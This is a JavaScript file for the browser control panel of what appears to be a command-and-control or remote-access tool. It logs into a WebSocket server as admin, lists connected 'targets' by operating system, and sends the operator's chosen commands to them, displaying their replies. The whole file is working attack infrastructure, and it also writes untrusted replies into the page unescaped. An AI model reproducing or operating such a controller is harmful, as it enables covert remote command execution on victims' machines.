

//static values
const randomUsername = Math.random().toString(36).substring(2, 8);
const secure = "ws"; //wss or ws

//dynamic values
let output = ""
let socket;

//elements
const urlInput = document.getElementById("urlInput");//url (input)
const passwordInput = document.getElementById("passwordInput");//password( input)
const connectButton = document.getElementById("connectButton");//connect (button)
const DisconnectButton = document.getElementById("disconnectButton");//disconnect (button)
const connectionStatus = document.getElementById("connectionStatus");//connection status (label)
const targetsSelector = document.getElementById("targetsSelector"); //targets (select)
const commandsSelector = document.getElementById("commandsSelector"); //commands (select)
const notification = document.getElementById("notification"); //notification (label)
const sendButton = document.getElementById("sendButton");//send to server (button)
const outputTextarea = document.getElementById("output"); //output (textarea)
const clearButton = document.getElementById("clearButton"); //clear output (button)

//initial setup
DisconnectButton.style.display="none"; //hide disconnect button 

//functions (sub)

function clearOutput(){output = "";outputTextarea.innerHTML = output}; //clear output

function sendMessage(data){if(socket){socket.send(JSON.stringify(data))}}; //send message to server

function disconnectButtonPressed(){if(socket){socket.close();DisconnectButton.style.display="none";connectButton.style.display="block"}} //on disconnected button press

function loadTargetSelector(data){
    targetsSelector.innerHTML = ""; //clear the target selector
    targetsSelector.innerHTML = `<option  value="none">None</option>`; //add option with none value
    data.forEach(element => {targetsSelector.innerHTML+=`<option os="${element.os}" value="${element.username}"> ${element.username} [${element.os}]</option>`}); //load data into target selector
}; //load data into targets select

//load commands
function loadCommands(commands){
    commandsSelector.innerHTML = "";//clear command selector
    commandsSelector.innerHTML = `<option  value="none">None</option>`;//add none value to command selector
    if(commands){
        commands.command.forEach((command)=>{
            commandsSelector.innerHTML+=`<option  value="${command.code}">${command.name}</option>`
        })
    }

}

//target change event 
function targetChange(){
    if(targetsSelector.value!="none"){
        const selectedOption = targetsSelector.options[targetsSelector.selectedIndex]; //selected option
         let selectedOS = selectedOption.getAttribute('os'); //selected option os attribute value
         if(selectedOS!=""){
            const commands = JSON.parse(localStorage.getItem("commands"))[selectedOS]; ///get commands from localstorage of selected os
            loadCommands(commands);//load command
         }
    }else{
        commandsSelector.innerHTML=""; //clear command selector
        commandsSelector.innerHTML+=`<option  value="none">None</option>`; //add none value to command selector
    }
}

//send request to server
function sendToServer(){
    if(targetsSelector.value !="" && targetsSelector.value !="none" && commandsSelector.value !="" && commandsSelector.value !="none"){
        let requestModel = {type:"req",to:targetsSelector.value,data:commandsSelector.value}; // request model
        sendMessage(requestModel); //send message to server
    
        output+=` [${targetsSelector.value}](${new Date().toLocaleTimeString()}) >> ${commandsSelector.value} \n`; //add send into output variable
        outputTextarea.innerHTML = output;// load output text area
    }
}


//functions (main)
function manageMessage(event){
    let jsonData = "";
    connectButton.style.display = "none"; //disable connect button 
    DisconnectButton.style.display="block"; //show disconnect button
    try{jsonData = JSON.parse(event.data)}catch(e){} //check if data is json parsable
    const validJsonData = jsonData?true:false; // check if json data is available
    if(validJsonData){
        //response is target list
        if(jsonData.type === "tgt"){
            loadTargetSelector(jsonData.data)
        }
        ///response is commands list
        else if(jsonData.type ==="cmd"){
            localStorage.setItem("commands",JSON.stringify(jsonData.data))///load commands to local storage
        }
        //response is notification
        else if(jsonData.type ==="nt"){
            let notificationModel = `target ${jsonData.user} ${jsonData.con==true?"Connected":"Disconnected"} @ ${new Date().toLocaleTimeString()}`;
            notification.textContent = notificationModel; //notification 
            sendMessage({type:"tgt"}); //re request target list
        }
        //response is error
        else if(jsonData ==="err"){
            //if user is not found
            if(jsonData.data == "NO_USR"){
                output+=`User ${jsonData.user} Not available right Now\n`
                outputTextarea.innerHTML = output;//add message  into output textarea
            }
        }
        ///response is data from target
        else if(jsonData.type ==="res"){
            output+=` [REPLY] (${new Date().toLocaleTimeString()})${jsonData.from} >>  ${jsonData.data}\n\n`
            outputTextarea.innerHTML=output; // add data into output textarea
            outputTextarea.scrollTop = outputTextarea.scrollHeight; //scrolls into bottom on all new message
        }
    }
    

}


//main websocket connection
function connect(){
    const hashedPassword = CryptoJS.SHA256(passwordInput.value).toString(CryptoJS.enc.Hex); //hashing passsword to sha256
    const urlModel = `${secure}://${urlInput.value}/{"username":"${randomUsername}","admin":true,"password":"${hashedPassword}"}`;
    socket = new WebSocket(urlModel);

    //on connection event
    socket.addEventListener('open',()=>{
        connectionStatus.textContent="Connecting.."; //set connection status to connecting...
        sendMessage({type:"tgt"}); //request target list
        sendMessage({type:"cmd"}); //request command list
    });

    //on message event
    socket.addEventListener('message',(event)=>{
        connectionStatus.textContent = "Connected";//set connection status to connected
        manageMessage(event); //manage message function
    });

    //on close event
    socket.addEventListener('close',()=>{
        connectionStatus.textContent ="Not Connected"; //set connection status to not connected
        localStorage.removeItem("commands"); //remove commands stored in localstorage
    });
}

//events
connectButton.addEventListener('click',connect); //connect button event
DisconnectButton.addEventListener('click',disconnectButtonPressed)//disconnect button event
targetsSelector.addEventListener('change',targetChange); //target select change
sendButton.addEventListener('click',sendToServer); //send request to server buttonn pressed
clearButton.addEventListener('click',clearOutput)